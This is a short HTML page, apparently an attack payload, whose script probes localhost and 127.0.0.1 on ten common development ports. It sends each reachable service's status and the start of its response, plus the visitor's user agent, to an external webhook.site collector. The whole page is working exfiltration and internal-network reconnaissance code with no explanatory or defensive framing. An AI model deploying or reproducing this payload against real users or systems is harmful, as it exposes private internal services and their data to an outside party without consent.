<!DOCTYPE html>
<html><body><script>
var wh='https://webhook.site/147c31f4-eca8-4ea7-a98e-d285652981b8';
function beacon(k,v){fetch(wh+'?k='+encodeURIComponent(k)+'&v='+encodeURIComponent((v||'').slice(0,300)),{mode:'no-cors'});}
var hosts=['127.0.0.1','localhost'];
var ports=[80,3000,5000,8000,8080,8081,9000,4000,1323,9090];
hosts.forEach(function(h){ports.forEach(function(p){
  var u='http://'+h+':'+p+'/';
  fetch(u,{mode:'cors'}).then(function(r){return r.text().then(function(t){beacon('OK_'+h+'_'+p,r.status+'|'+t.slice(0,150));});}).catch(function(e){/*beacon('ERR_'+h+'_'+p,String(e).slice(0,60));*/});
});});
beacon('scan_started', navigator.userAgent);
</script></body></html>
